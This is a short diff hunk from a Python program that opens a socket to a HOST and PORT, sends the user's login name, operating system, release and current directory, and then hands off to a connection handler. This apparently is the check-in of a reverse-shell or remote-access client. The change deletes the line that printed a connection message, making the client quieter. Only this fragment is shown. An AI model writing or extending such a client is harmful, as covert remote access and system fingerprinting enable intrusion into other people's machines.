@@ -199,7 +199,6 @@ if __name__ == '__main__':
         try:
             CONNECTION = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             CONNECTION.connect((HOST, PORT))
-            print(f"[Connected] {HOST}::{PORT}")
             CONNECTION.send(f"{os.getlogin()} {platform.system()} {platform.release()} {Path.cwd()}".encode('utf-8'))
             connectionhandler()
 
